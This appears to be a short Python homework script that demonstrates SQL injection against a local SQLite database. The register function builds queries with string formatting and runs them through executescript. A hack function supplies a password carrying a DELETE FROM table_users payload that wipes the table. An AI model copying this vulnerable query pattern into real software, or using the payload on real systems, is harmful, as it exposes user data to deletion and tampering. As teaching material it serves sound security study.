import sqlite3


def register(username: str, password: str) -> None:
    with sqlite3.connect('../homework.db') as conn:
        cursor = conn.cursor()
        print(f"""
                    INSERT INTO `table_users` (username, password)
                    VALUES ('{username}', '{password}')  
                    """)
        cursor.executescript(
            f"""
            INSERT INTO `table_users` (username, password)
            VALUES ('{username}', '{password}')  
            """
        )

        conn.commit()


def hack() -> None:
    username: str = "Иванов И.В."
    password: str = """some_password'); DELETE FROM table_users; --"""
    register(username, password)


if __name__ == '__main__':
    register('wignorbo', 'sjkadnkjasdnui31jkdwq')
    hack()
